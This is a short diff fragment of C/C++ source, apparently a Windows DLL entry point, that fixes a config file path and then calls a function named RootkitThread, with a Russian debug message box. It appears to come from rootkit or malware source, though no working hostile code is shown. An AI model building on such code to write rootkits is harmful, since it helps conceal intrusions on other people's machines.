@@ -190,7 +190,7 @@ extern"C"  void WINAPI Start()
 	MessageBoxA(NULL, "Присоедините среду к процессу", NULL, 0);
 
 	 
-	Config::SetFileName("c:\\\\config\\config.bin");
+	Config::SetFileName("c:\\config\\config.bin");
 	
 	RootkitThread(NULL);
 
